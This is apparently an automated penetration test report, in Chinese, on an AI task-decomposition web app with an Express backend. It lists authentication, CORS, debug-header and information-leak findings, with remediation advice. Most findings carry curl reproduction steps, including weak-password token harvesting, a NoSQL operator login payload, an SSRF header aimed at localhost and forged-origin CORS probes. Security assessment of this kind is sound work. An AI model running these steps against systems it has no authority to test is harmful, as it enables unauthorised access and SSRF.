# 综合安全评估报告

**目标应用**: AI-Task-Decomposer（前端静态服务 + Express 后端 API）  
**评估日期**: 2026-07-08  
**评估范围**: `http://host.docker.internal:8081`（前端）、`http://host.docker.internal:3000/api`（后端 API）

---

## 目录

1. [架构概览](#1-架构概览)
2. [已确认的漏洞](#2-已确认的漏洞)
3. [信息泄露与配置问题](#3-信息泄露与配置问题)
4. [LLM 配额耗尽导致的测试限制](#4-llm-配额耗尽导致的测试限制)
5. [未发现漏洞的测试领域](#5-未发现漏洞的测试领域)
6. [综合风险矩阵](#6-综合风险矩阵)
7. [复现步骤汇总](#7-复现步骤汇总)
8. [修复建议](#8-修复建议)

---

## 1. 架构概览

| 组件 | 技术栈 | 访问地址 |
|------|--------|----------|
| 前端静态服务 | Nginx / 静态文件 | `http://host.docker.internal:8081` |
| 后端 API | Express (Node.js) | `http://host.docker.internal:3000/api` |
| 数据库 | MongoDB（推断） | 后端内部连接 |
| 外部 API | 上游 LLM 服务 | `https://api.hzyweb.xyz`（移动端源码泄露） |
| 认证机制 | JWT (HS256), 无状态 | 登录后签发 |

**部署环境**: Windows Server（`C:\Users\Administrator\Desktop\file\ai-task-decomposer\backend\server.js`）

---

## 2. 已确认的漏洞

### 2.1 CRITICAL: 自动注册 + 弱口令导致未授权访问

- **路径**: `POST /api/login`
- **风险等级**: 🔴 CRITICAL
- **描述**: 后端 `/api/login` 在用户不存在时自动创建账户，导致空用户名/空密码、`admin/admin`、`user/user`、`test/test`、`root/root`、`guest/guest` 等组合均可成功获取有效 JWT Token。
- **影响**: 攻击者可完全接管用户账户（userId: 1-6），访问所有需认证的 API 端点。
- **复现**:
  ```bash
  curl -s -X POST http://host.docker.internal:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin"}'
  # 返回 200 + JWT Token (HS256, 7天有效期)
  ```
- **JWT 示例**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTc4MzUyMzY5MywiZXhwIjoxNzg0MTI4NDkzfQ.ygmlssZQiKm2qWQ8m8f-t1GlOiB80cqBdYKqx2vR_Ho`
- **解码载荷**: `{"alg":"HS256","typ":"JWT"}`, `{"userId":1,"iat":1783523693,"exp":1784128493}`

### 2.2 HIGH: `/api/import` 端点缺少认证强制校验

- **路径**: `POST /api/import`
- **风险等级**: 🟠 HIGH
- **描述**: 即使完全不携带 `Authorization` 头部，请求 `/api/import` 仍返回 HTTP 200 SSE 响应而非 401 未授权。后端虽包含 JWT 中间件，但其校验逻辑允许无 Token 请求通过（回退至默认用户行为）。
- **影响**: 未认证用户可提交任务至 LLM，消耗上游 API 配额，或触发其他后端处理逻辑。
- **复现**:
  ```bash
  curl -s -X POST http://host.docker.internal:3000/api/import \
    -H "Content-Type: application/json" \
    -d '{"taskText":"hello"}'
  # 返回 200 SSE，无任何认证要求
  ```

### 2.3 HIGH: X-Dev-* 调试后门暴露

- **风险等级**: 🟠 HIGH
- **发现位置**: 桌面端和移动端源码
- **描述**: 前端代码（移动端 `mobile_index_01.html:1192`、`:1381-1385`，桌面端多处）嵌入了完整的开发者调试面板，支持自定义请求头：
  - `X-Dev-Key`: 可绕过认证检查
  - `X-Dev-Base`: 可覆盖上游 LLM API 基础地址（SSRF 入口）
  - `X-Dev-Model`: 可指定任意模型名称
  - `X-Dev-Body`: 可覆写 LLM 请求体参数
- **影响**: 攻击者可利用这些调试后门执行 SSRF、模型注入、认证绕过。虽然当前 LLM 配额耗尽无法验证全部效果，但代码级存在明确的后门入口。
- **源码证据**:
  ```javascript
  // mobile_index_01.html:1381-1385
  headers['X-Dev-Key'] = devApiKey;
  headers['X-Dev-Base'] = devApiBase;
  headers['X-Dev-Model'] = devModel;
  headers['X-Dev-Body'] = devBody;
  ```

### 2.4 HIGH: CORS 配置过于宽松

- **路径**: 所有 API 端点
- **风险等级**: 🟠 HIGH
- **描述**: 后端对所有来源返回 `Access-Control-Allow-Origin: *`，允许 GET、HEAD、PUT、PATCH、POST、DELETE 所有方法，未限制 `Access-Control-Allow-Headers`。
- **影响**: 任意第三方网站可直接发起跨域 API 请求。虽未设置 `Access-Control-Allow-Credentials`（浏览器阻止凭据读取），但服务端仍处理请求，可用于 CSRF 类攻击。
- **复现**:
  ```bash
  curl -s -I -X OPTIONS http://host.docker.internal:3000/api/login \
    -H "Origin: https://attacker.example" \
    -H "Access-Control-Request-Method: POST"
  # 返回 Access-Control-Allow-Origin: *
  ```

### 2.5 HIGH: 密码重置流程存在用户枚举

- **路径**: `POST /api/password/send-reset-code`
- **风险等级**: 🟠 HIGH
- **描述**: 无论用户名是否存在，均返回 400 `"该账号尚未绑定邮箱，无法通过邮箱找回密码"`，但结合自动注册机制，攻击者可枚举已注册用户名。
- **影响**: 辅助信息收集，配合弱口令攻击可提升成功率。
- **复现**:
  ```bash
  curl -s -X POST http://host.docker.internal:3000/api/password/send-reset-code \
    -H "Content-Type: application/json" \
    -d '{"username":"admin"}'
  # 返回 400 "该账号尚未绑定邮箱"
  ```

### 2.6 MEDIUM: JWT 长有效期且无吊销机制

- **风险等级**: 🟡 MEDIUM
- **描述**: JWT Token 为 HS256 无状态 Token，有效期为 7 天（exp 偏移量约 604,800 秒），服务端无 Token 吊销列表或黑名单机制。Token 泄露后攻击者可在 7 天内任意使用。
- **影响**: Token 泄露后果严重，无单点登录限制（同一 Token 可多设备并行使用）。

### 2.7 MEDIUM: 后端错误堆栈路径泄露（Windows 环境）

- **风险等级**: 🟡 MEDIUM
- **路径**: `POST /api/import`（空体/非 JSON）、`POST /api/login`（form-urlencoded NoSQL）
- **描述**: 无效请求导致后端返回完整的 Node.js 错误堆栈，泄露部署路径：
  ```
  TypeError: Cannot destructure property 'taskText' of 'req.body' as it is undefined.
    at C:\Users\Administrator\Desktop\file\ai-task-decomposer\backend\server.js:756
  ```
- **影响**: 确认服务器为 Windows 环境，泄露项目目录结构，辅助定向攻击。
- **复现**:
  ```bash
  # 方法1: 空请求体
  curl -s -X POST http://host.docker.internal:3000/api/import \
    -H "Content-Type: application/json" \
    -d ''
  # 返回 500 + 完整堆栈
  
  # 方法2: form-urlencoded NoSQL
  curl -s -X POST http://host.docker.internal:3000/api/login \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'username[$ne]=&password[$ne]='
  # 返回 500 + 堆栈
  ```

---

## 3. 信息泄露与配置问题

### 3.1 前端安全响应头缺失

| 安全头 | 状态 | 说明 |
|--------|------|------|
| `Strict-Transport-Security` | ❌ 缺失 | 无 HSTS，易受 SSL 剥离攻击 |
| `X-Frame-Options` | ❌ 缺失 | 页面可被嵌入 iframe（点击劫持） |
| `X-Content-Type-Options` | ❌ 缺失 | 允许 MIME 嗅探 |
| `Content-Security-Policy` | ❌ 缺失 | 无 CSP，允许任意脚本执行 |
| `Referrer-Policy` | ❌ 缺失 | 无引用来源策略 |

### 3.2 移动端后端 API 地址泄露

- **泄露地址**: `https://api.hzyweb.xyz`
- **发现位置**: `sources/mobile_01.html:1254`, `mobile_login.html:274`
- **影响**: 生产环境 API 地址暴露，攻击者可针对该域名发起进一步攻击。

### 3.3 外部 CDN/资源引用过多

共发现 58 个外部 URL/CDN 引用，包括：
- `fonts.googleapis.com`（Google Fonts）
- `cdn.jsdelivr.net`（6 个 JS/CSS 库）
- `v1.hitokoto.cn`（一言 API）

增加了供应链攻击面和隐私泄露风险。

---

## 4. LLM 配额耗尽导致的测试限制

### 4.1 影响范围

所有依赖上游 LLM 服务处理的测试均因 API 返回错误码 **1113**（余额不足或无可用资源包）而无法验证：

| 测试领域 | 受影响测试数 | 状态码 | 现象 |
|----------|-------------|--------|------|
| SSRF（X-Dev-Base） | 15+ | 200 SSE | 全部返回 `[后端请求或解析失败]`，无差异化响应 |
| X-Dev-Model 注入 | 5 | 200 SSE | 所有模型名（含无效名）返回相同预置 JSON 响应 |
| X-Dev-Body 覆写 | 3 | 200 SSE | 参数覆写无差异化响应 |
| X-Dev-Key 绕过 | 9 | 200 SSE | 所有 Key 返回相同失败响应 |
| 命令注入（/api/import） | 4 | 200 SSE | 注入载荷被正常解析为 taskText |
| 文件名/扩展名绕过 | 14 | 200 SSE | 所有变体返回相同 `[后端请求或解析失败]` |
| SSE 流注入 | 7 | 200/400 | 有效 JSON 均返回预置失败响应 |

### 4.2 对评估结论的影响

- **SSRF 可被利用但无法验证内网可达性**: 通过 `/api/decompose` 和 `/api/ask` 的 500 错误/429 状态码，可确认后端实际发起了 HTTP 请求至 X-Dev-Base 指定的目标，但因 LLM 配额耗尽无法提取内网响应数据。
- **注入类漏洞无法验证**: 所有依赖 LLM 处理的注入（提示注入、模型注入）均被配额错误阻塞，无法判断 payload 是否在 LLM 上下文中生效。
- **文件处理漏洞无法验证**: 所有依赖 LLM 的路径遍历/文件名绕过均返回通用错误，无法测试真正效果。

---

## 5. 未发现漏洞的测试领域

| 测试领域 | 结论 | 说明 |
|----------|------|------|
| 目录遍历（8081） | ✅ 已防御 | 所有遍历 payload 返回 404 |
| JWT 算法篡改（alg:none） | ✅ 已防御 | 返回 403 "Token 无效或已过期" |
| JWT 签名篡改 | ✅ 已防御 | 无效签名返回 403 |
| NoSQL 注入（/api/login） | ✅ 无法利用 | 后端期望字符串类型，操作符对象导致 500 |
| 命令注入（密码重置） | ✅ 无法利用 | 参数被安全校验拦截，视为普通字符串 |
| 密码重置验证码爆破 | ❓ 不可用 | 流程未绑定邮箱无法使用 |
| XXE 注入 | ✅ 无法利用 | body-parser 不处理 XML，返回 500 |
| Cookie/会话劫持 | ✅ 无此风险 | 后端无 Cookie 机制 |

---

## 6. 综合风险矩阵

| # | 漏洞 | 风险等级 | 可利用性 | 影响范围 |
|---|------|---------|---------|---------|
| 1 | 自动注册 + 弱口令 | 🔴 CRITICAL | 易利用 | 全系统未授权访问 |
| 2 | /api/import 未认证访问 | 🟠 HIGH | 易利用 | API 配额消耗 |
| 3 | X-Dev-* 调试后门 | 🟠 HIGH | 中等（需结合 SSRF） | 数据泄露、SSRF |
| 4 | CORS 配置宽松 | 🟠 HIGH | 易利用 | CSRF、信息泄露 |
| 5 | 用户枚举（密码重置） | 🟠 HIGH | 易利用 | 信息收集 |
| 6 | JWT 长有效期无吊销 | 🟡 MEDIUM | Token 泄露后利用 | 账户持久接管 |
| 7 | 后端错误堆栈泄露 | 🟡 MEDIUM | 易触发 | 路径信息泄露 |
| 8 | 前端安全响应头缺失 | 🟢 LOW | 需其他漏洞配合 | 辅助攻击面 |
| 9 | 移动端 API 地址泄露 | 🟢 LOW | 被动收集 | 信息收集 |
| 10 | 大量外部 CDN 引用 | 🟢 LOW | 供应链攻击 | 辅助攻击面 |

---

## 7. 复现步骤汇总

### 步骤 1：环境确认
```bash
# 测试前端可达性
curl -s -o /dev/null -w "%{http_code}" http://host.docker.internal:8081/
# 返回 200

# 测试后端可达性
curl -s -o /dev/null -w "%{http_code}" http://host.docker.internal:3000/api/login
# 返回 404（正常，需 POST）
```

### 步骤 2：获取未授权访问
```bash
# 弱口令登录获取 JWT
TOKEN=$(curl -s -X POST http://host.docker.internal:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo $TOKEN
# 查看 JWT 载荷（Base64 解码）
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null
```

### 步骤 3：验证 /api/import 未认证访问
```bash
# 不携带任何认证头
curl -s -X POST http://host.docker.internal:3000/api/import \
  -H "Content-Type: application/json" \
  -d '{"taskText":"hello"}'
# 返回 200 SSE（应当返回 401）
```

### 步骤 4：触发后端路径泄露
```bash
# 空请求体触发 500
curl -s -X POST http://host.docker.internal:3000/api/import \
  -H "Content-Type: application/json" \
  -d ''
# 返回堆栈包含 C:\Users\Administrator\Desktop\file\ai-task-decomposer\backend\server.js
```

### 步骤 5：验证 CORS 配置
```bash
curl -s -I -X OPTIONS http://host.docker.internal:3000/api/login \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST"
# 返回 Access-Control-Allow-Origin: *
```

### 步骤 6：验证 X-Dev-* 后门
```bash
# X-Dev-Base SSRF 尝试
curl -s -X POST http://host.docker.internal:3000/api/import \
  -H "Content-Type: application/json" \
  -H "X-Dev-Base: http://127.0.0.1:3000/api/trees" \
  -d '{"taskText":"hello"}'

# X-Dev-Key 绕过尝试
curl -s -X POST http://host.docker.internal:3000/api/import \
  -H "Content-Type: application/json" \
  -H "X-Dev-Key: admin" \
  -d '{"taskText":"hello"}'
```

### 步骤 7：用户枚举
```bash
# 验证用户名是否存在
curl -s -X POST http://host.docker.internal:3000/api/password/send-reset-code \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}'
# 返回 400 "该账号尚未绑定邮箱"
```

---

## 8. 修复建议

### 8.1 立即修复（CRITICAL/HIGH）

| # | 问题 | 修复建议 |
|---|------|---------|
| 1 | **自动注册 + 弱口令** | 禁用自动注册功能；实施密码复杂度策略（最小长度8位、需包含特殊字符）；添加登录失败锁定机制（5次失败后锁定15分钟）；限制并发登录尝试 |
| 2 | **/api/import 无认证** | 在路由层面（而非中间件层面）强制校验 JWT；对所有 `/api/*` 端点实施统一的认证守卫；返回 401 而非处理请求 |
| 3 | **X-Dev-* 调试后门** | 在生产构建中移除所有调试面板代码；在前端构建流程中添加 Webpack/Vite 插件自动剥离调试代码；服务端禁用/忽略这些请求头 |
| 4 | **CORS 配置** | 将 `Access-Control-Allow-Origin` 设置为白名单域名而非 `*`；实施预检请求的严格来源验证 |
| 5 | **用户枚举** | 密码重置接口对存在/不存在的用户返回相同响应；添加通用错误消息避免信息泄露 |

### 8.2 短期修复（MEDIUM）

| # | 问题 | 修复建议 |
|---|------|---------|
| 6 | **JWT 长有效期** | 将 Token 有效期缩短至 15-60 分钟；实施 Refresh Token 机制；维护 Token 黑名单/吊销列表；添加单点登录限制 |
| 7 | **错误堆栈泄露** | 生产环境禁用详细错误堆栈；使用统一的错误处理中间件；记录详细错误到日志而非返回给客户端 |

### 8.3 长期修复（LOW）

| # | 问题 | 修复建议 |
|---|------|---------|
| 8 | **安全响应头缺失** | 添加 HSTS、X-Frame-Options、X-Content-Type-Options、CSP 安全响应头；使用 helmet.js 等中间件 |
| 9 | **移动端 API 地址泄露** | 将 API 地址移至后端代理或运行时配置；源码中仅保留相对路径 |
| 10 | **外部 CDN 引用** | 自托管关键库文件；实施 Subresource Integrity (SRI)；审查第三方依赖必要性 |

### 8.4 架构级改进

- **移除调试后门**: 建立严格的代码审查流程，防止开发调试功能流入生产环境
- **实施 API 网关**: 统一认证、限流、日志记录
- **安全开发生命周期**: 在 CI/CD 流程中加入自动化安全扫描（SAST/DAST）
- **上游 API 密钥管理**: 将 LLM API 密钥移至服务端环境变量，不暴露给前端

---

## 附录 A：测试环境信息

| 项目 | 值 |
|------|-----|
| 测试容器 | vxcontrol/kali-linux |
| 测试时间 | 2026-07-08 |
| 测试工具 | curl, gobuster, feroxbuster, whatweb, nmap |
| 后端环境 | Windows Server（路径特征 `C:\Users\Administrator\Desktop\`） |
| 上游 LLM | 代码 1113 - 余额不足或无可用资源包 |
| JWT 算法 | HS256 |
| JWT 有效期 | 7 天 |

## 附录 B：输出文件清单

```
/work/
├── final_report.md              # 本报告
├── Task14/
│   ├── frontend_audit_report.json    # 前端审计报告 (311KB)
│   └── frontend_audit_summary.md     # 前端审计摘要 (46.6KB)
├── Task20/
│   └── auth_session_cors_report.json # 认证/会话/CORS 报告
├── Task25/
│   ├── Task25_file_handling_report.json # 文件处理安全测试报告
│   └── *.log / *.sh                  # 测试脚本和日志
└── Task29/
    ├── injection_report.json          # 注入测试报告 (38.8KB)
    └── injection_report.md            # 注入测试摘要 (37.1KB)
```

---

*报告生成日期: 2026-07-08 16:11 UTC*
